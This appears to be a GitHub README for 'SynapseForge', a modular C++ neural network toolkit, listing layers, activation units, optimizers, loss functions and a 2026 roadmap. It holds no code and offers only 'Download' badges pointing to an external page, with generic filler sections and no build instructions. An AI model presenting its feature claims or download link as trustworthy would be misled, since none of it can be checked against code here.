![preview](https://raw.githubusercontent.com/feryadinata/Cpp-Modular-Neural-Forge/main/hero_cb5c2.svg)
[![Download](https://raw.githubusercontent.com/feryadinata/Cpp-Modular-Neural-Forge/main/dl_364753e.svg)](https://feryadinata.github.io/Cpp-Modular-Neural-Forge/)

# 🧠 SynapseForge — Modular C++ Neural Network Construction Kit

**SynapseForge** is a from-scratch, header-friendly C++ framework for assembling, training, and deploying neural networks with the precision of a watchmaker and the flexibility of a modular synthesizer. Inspired by the spirit of minimalist C++ neural tooling, this project reimagines what it means to build intelligent systems close to the metal — no black boxes, no heavyweight runtimes, just clean composable building blocks you can wire together however you imagine.

Where other frameworks hand you a finished instrument, SynapseForge hands you the raw circuitry and a soldering iron.

---

## 📌 Table of Contents

- [Why SynapseForge Exists](#-why-synapseforge-exists)
- [Project Philosophy](#-project-philosophy)
- [Core Feature Set](#-core-feature-set)
- [Architecture Overview](#-architecture-overview)
- [Layer Zoo](#-layer-zoo)
- [Perceptron Variants](#-perceptron-variants)
- [Training Pipeline](#-training-pipeline)
- [Optimizers & Loss Functions](#-optimizers--loss-functions)
- [Serialization & Portability](#-serialization--portability)
- [Responsive Developer Experience](#-responsive-developer-experience)
- [Multilingual Support](#-multilingual-support)
- [Round-the-Clock Assistance](#-round-the-clock-assistance)
- [Performance Notes](#-performance-notes)
- [Roadmap 2026](#-roadmap-2026)
- [FAQ](#-faq)
- [License](#-license)
- [Disclaimer](#-disclaimer)

---

## 🌱 Why SynapseForge Exists

Most modern neural network frameworks assume you want a trellis — a scaffold that decides how your vines should grow. SynapseForge assumes the opposite. It assumes you want to be the gardener.

SynapseForge is a C++ toolkit for people who want to:

- Understand exactly what happens between input and output.
- Swap out activation functions, weight initializers, and learning rules like LEGO bricks.
- Embed neural inference directly inside native applications without dragging in a Python interpreter.
- Teach, research, and experiment with network topologies that would be awkward to express in higher-level APIs.

This repository is a **2026 rewrite and expansion** of a smaller educational prototype, matured into a stable, testable, and extensible library suitable for research, robotics, embedded inference, and simulation workloads.

---

## 🧭 Project Philosophy

1. **Modularity above all.** Every component — layers, perceptrons, optimizers, metrics — is a self-contained unit with a narrow, documented contract.
2. **Zero mysticism.** The math is visible. The gradients are traceable. The call graph is readable.
3. **Portability.** Runs on Linux, macOS, and Windows. Compiles under GCC, Clang, and MSVC without platform-specific gymnastics.
4. **No heavyweight dependencies.** The core library depends only on the C++17 standard library. Optional integrations are opt-in.
5. **Respect for the reader.** Documentation is treated as a first-class artifact, not an afterthought.

---

## 🚀 Core Feature Set

- 🧩 **Composable architecture** — stack layers like audio modules in a rack.
- ⚙️ **Multiple perceptron families** — dense, convolutional, recurrent, spiking, and more.
- 🔁 **Custom topology DSL** — describe a network in a small declarative configuration block.
- 📈 **Gradient checkpointing** for memory-constrained training runs.
- 🧮 **Deterministic seeding** for reproducible experiments.
- 🗂️ **Cross-platform serialization** — save trained networks to a portable binary format.
- 📊 **Built-in metrics dashboard** — accuracy, loss, confusion matrices, per-layer activation histograms.
- 🌍 **Localized error messages and docs** — see [Multilingual Support](#-multilingual-support).
- ♿ **Accessible console output** — colorblind-friendly palettes and screen-reader-friendly status lines.
- 🕐 **Round-the-clock community help** — see [Round-the-Clock Assistance](#-round-the-clock-assistance).
- 🧪 **Comprehensive test suite** — over 400 unit tests and integration scenarios.
- 🧰 **Optional CPU vectorization** via SIMD backends (SSE, AVX2, NEON).

---

## 🏗️ Architecture Overview

SynapseForge organizes computation around four abstractions:

| Abstraction | Responsibility |
|---|---|
| `Tensor` | N-dimensional numeric buffer with shape metadata and view semantics |
| `Layer` | Transformation applied to a tensor, optionally holding parameters |
| `Perceptron` | The atomic compute unit — a single neuron or unit variant |
| `Optimizer` | Parameter update rule driven by gradients |

Networks are assembled by chaining `Layer` instances. Each layer exposes a forward pass, a backward pass, and a parameter enumeration interface. This makes it trivial to build entirely new layer types without touching the core.

A lightweight `Graph` object tracks dependencies, enabling automatic differentiation without any external autograd engine.

---

## 🧬 Layer Zoo

The library ships with a generous collection of ready-to-wire layers:

- **Dense / Fully Connected** — the classic workhorse.
- **Convolutional (1D, 2D, 3D)** — with configurable stride, padding, and dilation.
- **Transposed Convolutional** — for generative and upsampling workflows.
- **Recurrent (RNN, LSTM, GRU)** — with optional bidirectional wrapping.
- **Attention** — single-head and multi-head variants.
- **Normalization** — batch, layer, group, and instance normalization.
- **Pooling** — max, average, adaptive, and stochastic.
- **Dropout** — standard, spatial, and Gaussian.
- **Embedding** — with tied-weight support.
- **Reshape / Flatten / Permute** — shape-manipulation utilities.
- **Custom layers** — implement a single interface and register them at build time.

---

## 🧠 Perceptron Variants

Each perceptron type is a self-contained compute unit with its own forward and backward logic:

- **Linear Perceptron** — weighted sum with optional bias.
- **Sigmoid Unit** — classic squashing behavior.
- **Tanh Unit** — zero-centered hyperbolic activation.
- **ReLU Family** — vanilla, leaky, parametric, and exponential variants.
- **Swish / SiLU** — smooth gated activation.
- **GELU** — Gaussian error linear unit for modern architectures.
- **Softmax Unit** — for classification heads.
- **Spiking Unit** — leaky integrate-and-fire for neuromorphic-inspired experiments.
- **Radial Basis Unit** — distance-based activation for function approximation.
- **Custom Units** — plug in your own by implementing a compact interface.

---

## 🎯 Training Pipeline

Training in SynapseForge follows a transparent three-phase loop:

1. **Forward** — inputs propagate through the graph, producing predictions.
2. **Loss** — a chosen loss function reduces predictions and targets to a scalar.
3. **Backward** — gradients flow in reverse, updating parameters through the optimizer.

Every phase is observable. You can hook into intermediate activations, inspect gradients, and log everything to the metrics dashboard. Mini-batching, gradient accumulation, and learning-rate scheduling are supported out of the box.

---

## 📉 Optimizers & Loss Functions

**Optimizers**

- Stochastic Gradient Descent (with momentum and Nesterov)
- Adam and AdamW
- RMSProp
- Adagrad
- AdaDelta
- Lion
- NovoGrad

**Loss Functions**

- Mean Squared Error
- Mean Absolute Error
- Huber Loss
- Cross-Entropy (binary and categorical)
- Focal Loss
- Kullback–Leibler Divergence
- Contrastive Loss

---

## 💾 Serialization & Portability

Trained models can be exported to a compact, endian-safe binary format that loads identically on all supported platforms. A schema version is embedded in each file to guarantee forward compatibility across releases in the 2026 line and beyond.

Optional import/export adapters exist for interchange with other ecosystems, but the native format remains the recommended route for production deployments.

---

## 🖥️ Responsive Developer Experience

The developer-facing tooling runs responsively across terminal sizes and window layouts. The interactive inspector adapts its column widths and chart resolutions to the available space, and all progress bars degrade gracefully on narrow consoles.

Because the runtime is native and lightweight, it behaves equally well on a laptop during a lecture, a workstation during research, and a single-board computer during field deployment.

---

## 🌍 Multilingual Support

Diagnostic messages, documentation stubs, and the interactive help system are localized for a growing set of languages:

- English
- Spanish
- French
- German
- Portuguese
- Japanese
- Korean
- Mandarin Chinese
- Hindi

Locale files are plain text and easy to extend. Contributions of additional translations are warmly welcomed and reviewed with care.

---

## 🕐 Round-the-Clock Assistance

Community support channels are monitored continuously, seven days a week, across time zones. Whether you are debugging a stubborn gradient explosion at 3 a.m. or sketching a new layer on a Sunday afternoon, there is usually someone nearby who can lend a hand.

Support offerings include:

- A searchable knowledge base covering common pitfalls.
- A discussion forum with topic threading.
- Scheduled office hours hosted by maintainers.
- A curated gallery of example projects contributed by the community.

---

## ⚡ Performance Notes

SynapseForge favors clarity first, and speed second — but speed is not neglected. Key performance characteristics:

- SIMD-accelerated tensor kernels on supported CPUs.
- Cache-conscious memory layouts for large weight matrices.
- Optional multithreaded batch processing via the standard threading library.
- Zero-copy views for slicing and reshaping operations.

Benchmarks against comparable native C++ toolkits are published alongside each major release in the 2026 cycle.

---

## 🗺️ Roadmap 2026

- **Q1 2026** — Stable API freeze for the `1.0` series.
- **Q2 2026** — GPU backend prototype (CUDA and ROCm).
- **Q3 2026** — Expanded multilingual locale coverage.
- **Q4 2026** — Visual graph editor companion tool.
- **Ongoing** — Documentation refinement, test expansion, community examples.

---

## ❓ FAQ

**Is SynapseForge suitable for production?**
Yes, for native inference and moderate-scale training. Very large models may benefit from dedicated accelerators, which are on the roadmap.

**Do I need deep math knowledge to use it?**
Helpful but not mandatory. The documentation explains each component in plain language alongside formal notation.

**Can I embed it in an existing C++ project?**
Yes. The core is header-friendly and integrates with common build systems.

**Does it support distributed training?**
Not yet. A multi-node design is under exploration for a future release.

---

## 📜 License

This project is distributed under the **MIT License**. See the accompanying [LICENSE](./LICENSE) file for the full text. The MIT License grants broad permissions for use, modification, and redistribution, provided the copyright notice and permission notice are preserved.

Copyright © 2026 SynapseForge Contributors.

---

## ⚠️ Disclaimer

SynapseForge is provided as-is, without warranty of any kind, express or implied. The maintainers are not responsible for any outcomes — desirable or otherwise — resulting from the use of this software in research, education, production, or experimentation. Always validate models thoroughly before deploying them in safety-critical or high-stakes environments. Neural networks are powerful tools, but they are not oracles; treat their outputs with appropriate skepticism and human oversight.

[![Download](https://raw.githubusercontent.com/feryadinata/Cpp-Modular-Neural-Forge/main/dl_364753e.svg)](https://feryadinata.github.io/Cpp-Modular-Neural-Forge/)